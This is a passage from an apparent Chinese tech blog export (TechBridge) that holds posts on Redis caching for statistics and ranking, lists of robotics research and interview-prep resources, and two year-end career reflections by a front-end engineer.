這樣的好處是你可以減少記憶體的使用量，只保持某些「熱資料」會存在 Redis，其他比較冷門、不常被訪問的數據，就存在 Database，等到被訪問的時候再寫到 Redis 即可。  
統計系統其實上面講到的短網址服務，除了縮網址這個功能，還有另一個重點，那就是：統計資料。例如說 Google 短網址，會提供給你：造訪次數、圖表、用什麼裝置等等，這些才是短網址服務的核心。  
如果要做這個功能，那你勢必要記錄每一次 Request，或至少要把 Request 的內容（用什麼手機、時間點、IP）記錄下來，才有數據可以給使用者看。  
存在 Database，讀取也是每次都從 Database 讀的話，就會造成一些效能上的 issue，例如說每次 refresh 統計頁面，你就必須重新：select conut(*) from short_url where id=&quot;abc123&quot;一次，才能抓到總共有多少人造訪。  
還記得我們提過的 INCR 嗎？這不是就派上用場了！可以自己定義 key 的格式，例如說：abc123:visit 代表 abc123 這個短網址的總共造訪次數，接著，只要在每一次的 Request 都執行：INCR abc123:visit，這個 key 裡面就是你要的數字了，以後都從 Redis 讀取就好。  
除了這個以外，假設你想要提供「不重複 IP 訪問次數」，前面提到的 Set 就很適合。可以把每一個 Request 的來源 IP 都丟進一個 Set，只要用 SCARD 就可以知道有多少不重複 IP 了，很方便對吧！
高即時性排名系統我曾經做過一個專案，需求如下：  

中午 12 點開放使用者進入網站，並且回答一題問題
回答完後會看到自己的排名（依答題時間排序），照名次獲得獎品
只有前 300 名有獎品，之後都沒有

可以先想一下有哪些地方會需要跟資料庫溝通  

進入網站時，要先檢查是否超過 300 名，有的話提示活動結束（select count(*)…）
接著檢查使用者是否已答題過，已答題過的話就顯示排名（select .. where id&#x3D;..）
若沒答過，顯示答題頁面
答題結束之後，顯示使用者名次（insert into .. id&#x3D;..）

由於這個活動只有前 300 名有獎品，預估使用者有 10000 人的話，可能在 10 秒內這個活動就結束了！  
10 秒內你的資料庫必須「同時承受」這麼多個 query，可能會有點吃不消，而且仔細檢視之後，會發現很多地方其實沒有必要用資料庫來做，或者是說，用 Redis 來做會更好！  
例如說，可以這樣規劃：

用一個 key：isOver 儲存活動是否結束
用 account 當做 key，裡面儲存使用者的名次

上面的流程就可以改寫成：

進入網站時，去 Redis 讀取 isOver，查看活動是否結束
檢查使用者是否答題過，看 Redis 的使用者帳號這個 key 有沒有資料
若沒答過題且答完題，寫入資料庫，並且把名次寫入 Redis
若是這個使用者的排名&gt;&#x3D;300，設定 isOver &#x3D; true

原本需要三個對資料庫的操作，現在縮減到只剩下最必要的一個，其他都可以交給 Redis 處理。而且又因為 Redis 是 in-memory 的資料庫，反應速度非常快！再加上我們的 key 並不多（一萬多個 key 而已），用到的記憶體很少。  
就這樣，透過 Redis 的幫助，很順利的就可以解決原本資料庫負載太重可能會很慢甚至掛掉的問題。
總結若是下次你有些專案使用者很多，或是需要很快速的返回資訊，但是又怕資料庫撐不住，不妨想想是不是能夠導入 Redis，或其他也是做快取的 service。其實在很多場合，如果快取運用得宜的話，可以減輕很多資料庫的負擔，同時也加快響應的速度。
若是你對 Redis 很有興趣，可以參考 Redis 設計與實現 這個網站。
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>Redis, Database, Cache</tag>
      </tags>
  </entry>
  <entry>
    <title>認知機器人研究資源整理</title>
    <url>/2018/08/04/resrc-for-cognitive-robotics/</url>
    <content><![CDATA[前言認知機器人一直是我很有興趣的研究領域，所以想把一些常用的研究資源整理下來，也分享給大家，讓想要踏入相關領域的研究者，能站在這些資源之上開開心心地研究。
最新論文資源
CORL
CORL 的全名是 Conference on Robot Learning，一聽就知道 是老江湖了 是跟機器人的學習和認知相關的一個 conference。
因為這幾年來將 deep learning、reinforcement learning 等等方法應用到機器人學習的研究越來越多，索性開一個專門的 conference 來討論。

ICRA cognitive robotics
身為機器人領域中數一數二大的 conference，當然也是會有 cognitive robotics session 啦！

ICRA best cognitive robotics paper award
同上，可以參考 best paper award，直接追上最頂尖的論文。

Arxiv
Robotics、Machine Learning、Artificial Intelligence 跟 Neural and Evolutionary Computing 都是不錯值得關注的類別。


學習資源看來看去這些研究都好厲害啊，怎麼補足基礎知識呢。看個 Awesome list 是個不錯的選擇。

Awesome Artificial Intelligence (AI)

What math is needed for artificial intelligence&#x2F;machine learning research?


一些頂尖研究者列幾位相當厲害的研究者，有興趣的讀者可以自己再上網找，畢竟這個領域牽涉到太多東西，舉凡電腦視覺、自然語言處理、路徑規劃、物品操作等等都可以是切入認知能力的研究路徑。

Joshua B. Tenenbaum（MIT）

Sergey Levine（UC Berkeley）

Noah D. Goodman（Stanford University）

Pieter Abbeel（UC Berkeley）

Stefan Schaal（USC）

Ken Goldberg（UC Berkeley）

Michael Beetz（University of Bremen）


總結今天跟大家分享了一些好用的研究資源，對這塊領域有興趣的讀者可以參考看看，有其他覺得不錯的資源也歡迎留言補充！
關於作者：

@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。

]]></content>
      <tags>
        <tag>cognitive robot</tag>
      </tags>
  </entry>
  <entry>
    <title>軟體工程師面試資源最簡整理與技巧分享</title>
    <url>/2018/07/07/resrc-for-swe/</url>
    <content><![CDATA[前言只要是在 CS 產業，想要當軟體工程師，基本的資料結構和演算法功力是必須要時時打磨的，這次就整理一些好用的工具，而且盡量把資源最小化，讓大家在準備面試時有足夠資源，又不會被太多資料弄得暈頭轉向。
線上練習寫 code 網站
Hackerrank

如果是剛開始刷題，可以透過寫 Hackerrank 的題目幫忙複習基本的資料結構和演算法。

Lintcode

Lintcode 有一些 ladder 也還不錯，可以幫助循序漸進地刷題。比如說下圖的 bit manipulation ladder：

Leetcode

Leetcode 應該就不用多說，很多人應該都知道，只要你有了一定基礎，需要大量練習題目，那 Leetcode 絕對是不二選擇。
而且 Leetcode 也可以按照不同的 topic，區分難易度，甚至可以花錢看到各公司常出的題目，也是很不錯。

線上課程如果想要有系統地學習，花點錢從線上課程學習也是很有效率的方法。
演算法與資料結構
九章算法課程

九章算法是中國有名的演算法教學網站，他們現在也推出了許多課程，如果是喜歡有人幫忙把資料整理好、並包含講解的，也可以先來上這個課，再好好刷題。
系統設計
Grokking the System Design Interview


技巧各項能力分開練習基本上要寫出一道題目，而且要做到 bug free，必須要有下列能力：

釐清問題（展現細心程度，可以跟面試官溝通清楚問題範圍再下手）
想出演算法（展現資料結構和演算法的應用能力）
寫出 pseudo code（展現把初步想法變成可運行程式的能力）
寫出 code（展現程式語言的掌握能力）
人體 testing &amp; debugging（展現 unit test、integration test 的基本能力）
溝通能力（問清楚問題、把自己的想法講清楚、在必要時尋求協助）

如果把所有能力都混在一起練習，就很容易混亂，因為每一道題目讓你卡的點可能都不同；反之，如果有意識地發現自己容易卡在什麼地方，就容易專項加強（例如你常常可以想出演算法並實作，但常常掛在 edge case，那你應該先加強 1，讓自己在釐清問題時就把 test case 考慮得更完善，再開始想演算法；然後也要加強 5，讓你在測試自己程式時，可以完整測試自己的程式是否可以 handle 在第 1 步考慮到的所有 test case）。
記錄過自己寫過的題目還有解法這一點 非常非常非常 重要！如果能夠把想過的解法清楚地寫下來，之後想要複習就會事半功倍，畢竟有很多很 tricky 的題目，如果每次都要重想，會花非常多時間。此外，如果想要準備得更充足，寫完問題想一想 follow-up question 會怎麼出也是很重要的，如果沒有文件累積，每次看到題目連以前想懂的東西都要重來，那又怎麼有時間準備更進階的問題呢？紀錄的工具很多種，像是寫個 blog、gitbook 或是 github repository 都是不錯的選擇。可以參考 這本 gitbook - leetcode note。
資源不用多，足夠就好說真的，網路上的面試準備資源超級多，整理得很用心的 github repository 如 awesome-interview-questions 也很多，但是，重點還是在於能否把題目寫出來。所以與其收集一堆資源但造成大腦超載，不如就專注在解題目上面。不過，我不是要否定這些資源的價值，因為每個人喜歡準備的方法不同，不同偏好就是和不同的資源（最簡單說就是有人喜歡文字學習，有人喜歡圖像學習，那同樣遇到想不出來的題目，喜歡圖像學習的人就可以去 youtube 找 解題的影片 看，而不必執著硬要看懂 leetcode 討論串）。
總結以上幫大家整理了一些好用的面試準備資源，如果你想要上手，可以從 hackerrank 跟 lintcode 開始找回資料結構和演算法的基本手感。要練習各種變形題目的話，就上 leetcode 狂刷題。如果看到某個知識想要更加了解，google 看看或是參考 awesome-competitive-programming、awesome-algorithms 之類的整理也很夠用了。
祝大家準備愉快！
延伸閱讀
花花醬刷 Leetcode Youtube Channel
軟體工程師面試資源整理
Google Code Jam 賽制介紹（如果沒要找工作，覺得自己刷到夠強了也可以衝一個看看拿 T-Shirt）

關於作者：

@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。

]]></content>
      <tags>
        <tag>software engineer, data structure, algorithm, interview</tag>
      </tags>
  </entry>
  <entry>
    <title>一個資淺工程師年末的自我省視</title>
    <url>/2016/12/31/review-2016/</url>
    <content><![CDATA[嗨大家，今天是 2016 年的最後一天了，先預祝大家新年快樂，能夠在明年有一個好的開始。同時也感謝大家對 TechBridge 的支持。
我自己喜歡看的技術文章有兩類，一種是分享一些實際的軟硬體技術，例如說教你怎麼用 Node.js 寫一個聊天機器人，或是怎麼用最新的 CSS 語法建造出酷炫的網頁效果等等。另外一種則是比較「軟」一點的心得分享文，例如說最近這陣子滿常看到被分享的這兩篇：接近 2016 年底的我是否有資格稱為資深工程師、技術人員的發展之路。
我預期大家在這週應該想要好好休息（其實我自己想好好休息），因此，就決定寫後面那一類型，來分享一下自己的心得感想。不過東想西想，身為一個工作經驗不到兩年的開發者，實在是很難給大家什麼「建議」，怕耽誤了大家。於是最後就決定來寫一篇自己在今年裡面體悟與學習到的幾件事情。
分享「分享」一直是我很注重的一件事情，在每篇文章最底下的「關於作者」，我也寫得很清楚了：

相信分享與交流能讓世界變得更美好

為什麼我覺得分享是一件重要的事情？因為從我接觸程式開始，就受過太多人的幫助了。例如說小時候剛開始學程式矇懞懂懂，曾經去過那時候最熱門的程式討論區程式設計俱樂部發問，就得到很多前輩的幫助。或者是長大之後上 ptt 尋求職涯上的或技術上的幫忙，也得到很多回饋。
更別提工作上碰到困難一定會用的Stack Overflow，以及要做什麼新功能之前會先找有沒有別人寫過模組的Github。
這些資源都不是一夕之間產生的，而是靠許多熱心的前輩們一點一滴累積起來，才有著現在的樣貌。這也是為什麼我覺得分享是一件很棒的事情。當大家都樂於分享的時候，就可以形成一個正向循環：「A 接受別人的分享得到收穫 -&gt; A 決定自己也要來分享 -&gt; 更多人接受別人的分享 -&gt; 更多人決定自己也要來分享」。
因為受到這些網路資源的幫助實在是太大，讓我下定決心自己也要當一個樂於分享的人，來回饋那些曾經幫助過我的人。
下面是一些我曾經分享過的心得文章（只列出幾篇比較多人看的），分散在 ptt 或者是我的個人部落格：

[心得] 15家中小型公司、新創公司面試心得分享
[情報] 免費程式入門教學(台北)
[心得] 十年程式自學之路
[教學] Line BOT API
[教學] Facebook Messenger API
[Javascript] Promise, generator, async與ES6
Re: [請益] 入行不到一年，去新加坡發展好嗎？

當初的初衷不為了什麼，就只是為了分享而已。只是覺得自己在過程中有收穫，所以想把心得感想分享給大家。例如說我自己做完 Line BOT 的時候，就發現有一些流程如果自己探索，可能要花很多時間，這時候我就會想把心得寫下來，讓之後的人可以參考。
我會那麼堅持分享的另外一個理由，是希望「我之後的人，都不要再走一遍我走過的路」。這是什麼意思呢？例如說我要到新加坡工作之前，曾經在網路上查了很多資訊，確實有很多實用的，但也有一些是很難查或是根本查不到的。因此當我來新加坡之後，我就希望我能夠分享這些「我以前想知道卻沒有人分享」的資訊，讓那些像我一樣想找這些資訊的人有地方可以找到。
我覺得這個概念有點像這一個網路上流傳的故事：

This is a story about four people named Everybody, Somebody, Anybody and Nobody.  There was an important job to be done and Everybody was sure that Somebody would do it.  Anybody could have done it, but Nobody did it.  Somebody got angry about that, because it was Everybody’s job.  Everybody thought Anybody could do it, but Nobody realized that Everybody wouldn’t do it.  It ended up that Everybody blamed Somebody when Nobody did what Anybody could have.

或者是 g0v 的座右銘：

「不要問為何沒有人做這個，先承認你就是『沒有人』」。因為，「沒有人」是萬能的。

跳下來吧，跳下來當第一個，幫大家解決那些你以前碰過、找不到資料的問題，從此以後就不會有人像你當時一樣找不到資料了。
而且有時候分享也會帶來一些意想不到的回報，例如說你去面試的時候可能面試官會跟你說：「我好像看過你的文章」。或者是可能有一些程式相關的機構會找你去講課，或是一些新聞媒體網站的訪問等等。這些都是在寫文章的時候沒有預料到的。但還是要再三強調，如果你是為了這些額外的回報才分享的話，就失去了分享的初衷。初衷很重要，那是唯一能夠支持你長久經營下去的動力。
有些人會覺得：「我那麼菜，哪有什麼可以分享？」。但其實是有的，因為你總是會找到比你更菜的人。你學程式一個月，總是可以找到學程式 15 天的人，我甚至覺得程式入門這種東西，應該由「新手」來教「超級新手」，為什麼？因為那些新手可能一個禮拜前跟你一樣卡在迴圈，不知道迴圈到底可以做什麼，但是這禮拜他就領悟了。我覺得這時候是最適合教學的時機，因為他們還記得「當初卡住的那種心情」，他們是最懂你心情的人。
像我接觸程式這麼久，你問我當初第一次學遞迴的時候是什麼感覺，我真的完全忘了。接觸久了以後，寫程式就像吃飯喝水一樣，你問我怎麼吃飯怎麼喝水，我只能跟你說：「阿不就把嘴張開吃飯嗎？這個要怎麼教？」。
所以儘管你覺得你很菜，你還是可以試著寫下自己學習程式的心得，以及自己卡關的地方跟之後怎麼解開的方法，相信一定會對比你更菜的人有幫助。像我現在寫的很多文章技術深度也很淺，但還是幫助了很多人一樣。
廣度 vs 深度技術的廣度跟深度到底哪一個重要（或者其實根本一樣重要），一直是一個爭論的話題。有些人覺得你知道的很多、很廣很好，代表各個地方你都懂一點，但缺點就是每一個地方都不夠深入。有些人覺得深度才是王道，才能成為某一個特定領域的專家，擁有獨特的技術洞見。
我可以很坦白地承認，我是一個有廣度沒深度的人，我之前寫過一年的 Android，有寫過一個即時通訊 App，也有維護並更新過一套公司內部的 SDK，並且導入熱更新的技術。可是如果你叫我去面試 Android 工程師，我還真的不敢去，一定被電得唏哩嘩啦。我可以獨立完成一個 Android App，這個決定沒問題，但如果你要問我一些更深的問題，例如說一個 Activity 被創建的整個流程，或者是某個 library 的底層實作，這些我全部都回答不出來。
所以你說我會寫 Android 嗎？好像會，又好像不太會。
我之前寫過一年的 Node.js，可以獨立做出一個後端服務，包括資料庫（MySQL）、快取（Redis）以及部署，Nginx 的設定我也不陌生，只是真的要用的時候還是要查文件就是了。可是如果你叫我去面試 Node.js 工程師，我也會被電得一塌糊塗，被問到 Node.js 更深入的問題的時候我就回答不出來了。例如說 Node.js 的底層實作或者是 this 代表什麼之類的。
所以你說我會寫 Node.js 嗎？好像會，又好像不太會。
其實對於廣度跟深度到底哪一個重要的這件事情，我到現在還是很迷惘。
因為我的確有體驗到廣度的重要性。例如說我現在雖然是一個前端工程師，但如果你真的只懂前端（HTML, CSS, JavaScript）的話，其實有很多問題你是解不開的。像是我最近寫的一個 Single Page Application，網址上面不想用 # 這個符號，而是想要長得跟正常連結一樣。
例如說原本的可能是http://example.com/#/home，我想讓他變成http://example.com/home，這個要怎麼設定呢？
因為我有碰過 nginx，所以我就知道說這個可以利用 nginx 來設，把那些路徑都導到index.html去就好了。但如果你根本不知道 nginx 在幹嘛，甚至不知道有這個東西存在的時候，這個問題對你來說可能就會比較難解。
有關廣度的話，我認為無論你做哪一個領域，都不可能對其他領域「一無所知」，至少要知道跟你有合作關係的領域大概在幹嘛，不然會很困擾。例如說做前端的就要懂一點後端、懂一點 Mobile。這樣在跟那些領域的工程師合作時才會比較順暢。
同時，我也有體驗到深度的重要性。
當你的技術深度不足時，有些問題是會卡住、解不開的。例如說你今天用 CSS 排版，用了一個套件之後發現有一個 div 的內容看不見了，但是把套件拿掉就出現了。如果你只會基本的 CSS，不知道那些 position, z-index 怎麼調整的時候，你就很難去解決這個問題。
又或者是我前陣子做直播，在 hls 的 player 上面碰到問題，發現有時候載入的情形很奇怪。我有嘗試過去閱讀播放器的源碼，但礙於我技術實力不足，以及對專有名詞跟整個播放過程不太理解，最後還是不知道要怎麼解決這個問題。
在面試的時候也有察覺到深度的重要性，或者說是一些「紮實基礎」的重要性。例如說面試官可能會問你「資料庫的 index 是什麼？」，我大概只能回答到「加 index 之後能讓查詢的速度變快」這樣子很淺的回覆。但基礎紮實的人能夠回答到有哪些 index，每一種的差別在哪裡，以及 index 在資料庫底層是怎麼實作的。
我自己一路走來，因為很愛玩一些有的沒的，所以技術廣度應該是還 ok，但技術深度就真的不足了。希望自己之後能走得更深一點，基礎打的更紮實。
小公司 vs 大公司這也是在職涯選擇上一個討論度很高的話題，而我覺得這個選擇其實跟上面說的廣度與深度的話題也有點關係。
以我自己待過新創公司的經驗，進去之後就是你一個人可能會負責很多個專案（例如說同時負責 Android 跟網頁前後端，如果你有能力的話），這時候你就能拓展你的技術廣度，學到很多不同的技術。但是把時間跟資源分配在這麼多不同的領域上面，缺點就是深度不夠深，就可能像我剛剛講的那些，你東西寫的出來，但是回答不出更深的問題。
大公司的話，因為我自己沒有待過，所以只能猜測一下在做什麼，應該是專門負責某一個領域，例如說有一個專業的 Android 團隊，可能有五六個人，一個 Team leader、兩三個 senior 工程師帶著 junior 之類的。你被分到的可能是一個很小的功能，要照著大家訂下來的規則去寫 code，寫完之後要做 code review，測試沒問題之後才能上線。在這邊，你可能可以花一個月只去研究一些性能優化的問題。
我自從第一間是待新創公司，待一年多之後其實想換到大公司去工作。為什麼？因為我想體驗大公司的開發流程。在很多新創公司，開發都沒有什麼流程，規則比較鬆散。例如說我自己一個人負責那整個專案的話，我要不要寫測試、程式碼風格要不要統一，這一切都取決於在我。有也可以，但沒有也可以，沒有人會管你，但是也沒有人會給你一些建議。優點是非常自由，缺點就是沒有人帶。
所以待久之後，就會想體驗一下大公司的開發流程到底長怎樣，想要試試看跟別人分工，而不再是自己一個人做一個專案。有人可以互相討論、互相指點，彼此教學相長。
不過無論是哪一種類型的公司，我覺得最重要的還是「找一份可以學到東西的工作」。這個道理很簡單，你一天必須花八個小時在這一份工作上面，如果你在這份工作已經找不到什麼可以學習了，那你的成長就停滯了。雖然當個薪水小偷領這些薪水也很不錯，但我覺得你也必須考慮到你之後的職涯發展（除非這份工作你本來就是要養老用的）。要找一份學得到的東西的工作，你才能邊工作邊成長，對你自己的生涯發展也會更順利一點。
要真的痛過，才能理解我之前有一陣子，每一天都會打開一些技術文章的網站，把前幾名都點開來看。那時候覺得自己學到好多東西，學到了大型分散式系統怎麼建的、學到了知名網路公司是怎麼管理軟體開發流程、學到了許多以前不知道的密技。可是我漸漸發現，自己好像其實什麼都沒學到。
那些技術文章如果每天看每天看，會有一種「我好像學到很多」的錯覺。但過一個月以後再問你當初看的那篇文章在講什麼，你還記得嗎？像我的話八成是忘記了，只大概記得文章的標題跟一點點內容而已。
覺得看很多篇技術文章就能學到很多技術的這種想法，我真的太天真了。實際上你把整篇文章看完，學到的可能只是作者理解的 30% 或者是更少而已。為什麼？因為你只是看，你沒有動手做，你也沒有實際碰過那個問題。所以那篇文章對你來說，就只是看著看著就忘記了。
我覺得在技術的學習上，「痛」是一件很重要的事。你要痛過，才能發自內心的想要解決那個問題，解決以後也才能真正的理解這個問題。
比如說今天你看了一篇文章在講大型搶票系統的伺服器架構與建置。你可能看完之後學到：嗯，有這一種建置的方法，下次可以來試試看。你就只學到這個「結論」而已。
可是 po 那篇文章的作者，他學到的是「一開始的搶票架構有什麼問題」、「改良後的架構解決哪些問題」、「兩者之間的優劣分別是哪些，適合什麼使用場景」。因為搶票系統的整個優化過程他都有參與，所以他絕對對這些問題刻骨銘心，可以講個兩三個小時。
我覺得看一篇技術文章你學到的可能只是表面，只是別人最後產出來的結論。你要真正理解的話，必須要自己跳下去動手做，實際去痛、才能領悟為什麼要這樣子做。
以我自己為例子，我剛開始的時候跟很多人一樣，不喜歡寫測試。我覺得自己手動測一測就好，幹嘛花時間去寫測試？但直到我「痛過」之後，我改觀了。因為有時候手動測的流程很繁瑣，你可能要打開頁面、登入、等個幾秒按按鈕之類的，每改一次 code 就必須要手動測試一遍。這個過程花了我很多時間，所以最後我就決定寫測試了。
或者是你每次都靠手動測試，但有一次某個流程忘記測到（因為你想說程式碼沒有改到那邊），然後晚上十二點接到 PM 電話說網站有嚴重的 bug，只好半夜加班去公司修 bug，才發現是自己忘記其實改動的地方跟出問題的地方是有連動的，所以才會出現這種 bug。有了這次經驗之後，為了不要再半夜到公司加班，相信你會很願意寫測試的。
我覺得很多工具都是這樣，你用它一定是有理由的，是因為它有打到你的痛點，而且要夠痛，你才會願意去用。
利用冗餘時間假如你負責的專案的需求已經開發的差不多了，於是你手邊沒有其他事情可以做，呈現一個很悠閒的狀態，你會做什麼？

滑手機
逛 facebook, ptt
優化程式碼

通常會選 1 或者是 2（我自己也是），但我最近選了 3。我會趁著沒有事情做的時候趕快看一下自己的程式碼有哪邊可以改進的，可以抽出來的部分就抽出來，並且自發性地幫我的程式加上 eslint 語法檢查以及一些簡單的 test。
以前累積下來的技術債，總有一天要還的，不然就只是越積越多，然後越難維護而已。我覺得應該好好利用這些難得的時間來對自己負責的程式做一些改進，不然等到下次再有這種時機，可能債已經很難還了。
維護履歷我覺得定期維護自己的履歷也是很重要的一件事。一方面是可以減輕自己的負擔，不要每次要求職的時候才花很多時間改，可以在平常就慢慢累積慢慢改。另一方面也是藉由定期維護履歷，可以檢視自己過去這段時間做了哪些事情、完成了哪些專案。
在這邊建議大家在 Linkedin 上面定期維護自己的英文履歷，如果不知道該怎麼寫的，我提供一個我個人實際試用過，非常有效的絕招：參考強者你朋友的。這一招真的很有效，參考那些強者朋友的履歷，你自己大概就會知道可以怎麼寫了。
像是我的 Linkedin就參考一些我朋友的，把一些我覺得我也會的技能也抄下來，然後把看起來覺得不錯的格式也學起來，最後拼拼湊湊就完成了自己的第一份英文履歷。而且完成之後，還真的有獵人頭的寄信來邀約，可見英文履歷還是很有用的。
結論就如同標題一樣，我是個資淺工程師，所以許多想法其實還很不成熟，很多的價值觀都還沒有確立，看的也不夠多。po 這篇文就只是希望能夠在年尾幫自己做個回顧，把到現階段為止的心得感想跟大家分享。或許以後我的想法會改變，這個很正常，那時的想法可能會比現在成熟許多。到那個時候，就可以自己來回覆這一篇文章，來幫自己解惑了。
最後，祝大家新年快樂！
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>Software Engineer</tag>
      </tags>
  </entry>
  <entry>
    <title>兩年過後，我能夠被稱為資深工程師了嗎？</title>
    <url>/2018/12/29/review-2018/</url>
    <content><![CDATA[前言在兩年前我寫了這篇一個資淺工程師年末的自我省視，內文主要是檢視自己那年學到的東西以及抒發心得感想，並提出一些對於自己職涯發展上的疑問。
標題之所以是打「資淺」工程師，是因為那時覺得連資深的邊都沾不上，所以用了資淺這個字來形容自己。
兩年過去了，職稱從工程師變成資深工程師，甚至還再往上變成了 Front-end Team Lead。雖然職稱本來就不代表一切，但我認為它至少「代表著什麼」，你到了那個位子就必須負起責任，如果覺得自己能力未及，就必須盡力去追趕，直到自己能擔起那個責任為止。
這篇會先回顧我這兩年來的發展，最後再分享一些自己的心得感想。
在這之前一樣先預祝各位讀者新年快樂！
技術的深度兩年前我在文中提到自己是一個有廣度沒深度的人，希望自己之後能走得更深一點，把基礎打的更紮實。而這兩年之間的確有朝這個方向邁進，開始發一些比較有深度的技術文章，這些文章的靈感常常來自於工作。
像是在工作時被資安部門警告有 CSRF 漏洞，於是花了點時間研究，並寫下了讓我們來談談 CSRF，也在差不多的時間點發現令我十分不解的 Cookie 問題，誤打誤撞解開後深入研究，理解問題以後寫了我遇過的最難的 Cookie 問題。不同的工作內容也會碰到不同的問題，例如說在做 PWA 時碰到的原來 CORS 沒有我想像中的簡單以及完成 PWA 後的PWA 實戰經驗分享。
除了工作上得到的靈感，自己深深覺得對 JavaScript 的基礎掌握不足，那些常見的面試題我從來沒有搞懂過為什麼。儘管這些在工作上不一定用得到，但如果我想成為資深工程師，我認為那是逃不掉的，是一定要理解的東西。
針對這個部分，我寫的第一篇文章是該來理解 JavaScript 的原型鍊了並且得到滿多好評，再來寫了深入探討 JavaScript 中的參數傳遞：call by value 還是 reference？，把自己對這個議題的意見做了個整理，然後是近期的我知道你懂 hoisting，可是你了解到多深？與所有的函式都是閉包：談 JS 中的作用域與 Closure，把知名的 hoisting 與 closure 都深入研究了一遍。這樣看下來，大概再把 this 寫完（我也有這個計畫要寫）就能把 JavaScript 那些比較常見的基礎給搞定了，再來可能就是型別轉換的一些問題。
除了 JavaScript 以外，也寫了幾篇文章是關於網路跟瀏覽器的，像是給新手看的輕鬆理解 Ajax 與跨來源請求、我以前一直被搞混最後終於弄懂的循序漸進理解 HTTP Cache 機制以及DOM 的事件傳遞機制：捕獲與冒泡，或偶爾研究一下比較新的東西像統一網頁支付介面：Payment Request API。
從 2015 年開始，我的前端開發生涯就一直圍繞著 React 打轉，所以有時候也會寫一些相關的主題像是React 性能優化大挑戰：一次理解 Immutable data 跟 shouldComponentUpdate與淺談 React Fiber 及其對 lifecycles 造成的影響，或是為了要用 redux-observable 而去學 RxJS 最後寫下的希望是最淺顯易懂的 RxJS 教學。
兩年之間寫了二十幾篇文章，要特別感謝 TechBridge 的夥伴們提出一起經營共筆部落格這個 idea，強迫自己一個月一定要寫出一篇文章來。
即使寫了這麼多，我知道還是有很多主題沒有涵蓋到，就算是寫過的主題也不一定已經完全理解，我覺得這是寫作的人要很小心的一個部分（或也可以說是我對自己的提醒），否則一不小心就會變得自大了起來，卻沒意識到這個世界比你想像中大的多。
像是我前幾天看到這篇文章：騰訊前端面試篇（一）分享自己去騰訊面試的心得，裡面問到的有些題目其實我就不會，所以要學的還多著呢。
除了不能自大以外，也要小心不能妄自菲薄，但這超級難，有時候這個點很難抓，要慢慢去找到那個界線。我不會說自己對某個主題理解到百分之百，但也不會說自己完全不理解，畢竟寫了這麼多主題，對寫過的東西還是有一定程度的理解，這點自信還是要有的。
話說還有一個要小心的陷阱，那就是其實很多人都會這些技術，只是沒有 po 文沒有分享而已。我以前曾經認為有些東西找不太到文章是不是沒什麼人會，不是，他們只是沒有分享出來而已，還是有很多人會的。
技術的廣度兩年前我覺得自己廣度比深度多很多，因此我寫了一大堆文章針對不同的主題深入研究，讓自己對技術的理解變得更深。
那廣度呢？有了深度以後，我對廣度便不是這麼在乎了。我在第一份工作時還沒決定好自己想往哪裡走，因此我用 node.js 寫後端，用 react+redux 寫前端，還用 Java 寫了 Android 的 App。
可是在那之後我變成了專職的前端工程師，因此對後端技術便不是那麼關注，有哪些新的潮流我都不知道，更不用說 mobile 了。還是會維持一些基本的敏感度，例如說知道新出的 Flutter 之類的，但也僅僅知道這個關鍵字而已。
這其實也是我想走的方向，我覺得先廣再深其實是很不錯的一件事，你得先廣才能去找到自己想走的方向，並且也在這段時期累積一些對其他領域的基本理解，接著才走深，去深入理解你選的那個領域。
以我來說，我在廣度時期讓自己理解後端、Mobile 開發或是一點架構層面的東西，這些都對我之後的職涯很有幫助，至少我有基本的概念，不會什麼都不懂。
而現在進入到深度時期，把心力放在 JavaScript、瀏覽器、網路跟 React，其他的便不是那麼關注。
但如果要我挑幾個在這以外想研究一下的主題，我會選 GraphQL 跟 Vue，希望能對這兩個東西有基本的理解。
融會貫通到了某個時期，會開始能把以前學過的東西融會貫通並且確切的知道其脈絡發展，而我在這兩年間似乎就到了這個時期。
其實以前就有這種能力了，只是在近期變得更明顯而已。掌握了脈絡以後就能夠很清楚地去解釋一項技術的出現以及為什麼要選用這個技術，能夠知道背後的核心思想，經過這樣的思考以後寫出來的東西是不一樣的。
除了技術深度的發展以外，我也會寫一些面向一般大眾的科普文，像是零基礎的小明要如何成為前端工程師？以及跟著小明一起搞懂技術名詞：MVC、SPA 與 SSR，就是自己整理消化以後再產生出來的東西。
我自己認為之所以這些文章底下一片好評，就是因為它有脈絡。技術的發展是有脈絡的，React 會出現一定是為了要解決一些 jQuery 沒辦法解決、Angular 也沒辦法解決的問題，否則我們不需要一個新的技術，而這新技術也不會變得那麼受歡迎。
只要能夠找到那個理由，就能把這些點串起來連成一條線，連多了就變成一個面，成為完整的知識圖譜。
在上面那兩篇文章中我從最陽春的狀態開始一步步往下推，其實就好像數學證明或是邏輯證明那樣，每一步都跟上一步有關，在證明的過程中會變得越來越複雜，但每個步驟都是環環相扣的。
叫一個新手直接去碰 React，就好像直接讓他從證明的第十步開始往下做，他不知道怎麼到這裡來的，也需要花很多時間去研究該怎麼前進到下一步。但如果你讓他從第一步開始，帶他到第二步、第三步這樣一步步證明下去，當到了第十步時，他知道自己為何在這裡，他知道這一步其實是前面十步的累積，這就是有脈絡跟沒有脈絡的差異。
而我的那些文章之所以特別，是因為我帶讀者從第一步開始走，一步步帶著他們到第十步。所以對沒什麼基礎的人來說，不會感到特別困難；對已經有基礎的人來說，會把以前學過的東西全部串起來，有種煥然一新的感覺。
教學從以前其實就陸陸續續有在做教學，但在今年的一月終於嘗試了自己一直以來想做的事：從零到一培養一個工程師。
總共還做了兩期，計畫詳細內容可參考：程式導師實驗計畫第二期報名簡章，課程大綱也放到了 GitHub 上面，想跟著學的可以自行取用。
目前第二期已經慢慢接近尾聲，但大概要等二月初才比較好評量成效。在教學的過程中我才是學到最多東西的那個人，每次準備教學前我都必須確定自己能完全掌握要講的主題，趁機理解了一些以前很少接觸到的概念，像是資料庫的 View、Stored Procedure 跟 Trigger 以及 ACID。
課綱的部分也是按照我前面所講的脈絡設計而成，但碰到的問題是難度落差有點太大，所以還有滿多需要調整的地方。不過整體而言教的東西我認為是沒什麼問題的，該學的都有學到，而且不只學了工具，也學了原理。
